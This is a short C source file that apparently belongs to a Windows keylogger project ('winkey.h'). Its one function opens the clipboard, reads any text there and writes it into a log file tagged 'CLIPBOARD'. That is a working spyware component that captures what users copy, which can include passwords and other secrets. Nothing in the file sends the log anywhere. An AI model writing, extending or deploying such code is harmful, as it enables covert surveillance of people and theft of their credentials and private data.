#include "winkey.h"

void	GetClipboard(FILE *flog)
{
	HGLOBAL hGlb = 0;

	if (!OpenClipboard(0))
		return;
	hGlb = GetClipboardData(CF_TEXT);
	if (hGlb) {
		char* str = GlobalLock(hGlb);
		if (str) {
			fprintf_s(flog, "{CLIPBOARD: %s}", str);
		}
		GlobalUnlock(hGlb);
	}
	CloseClipboard();
}
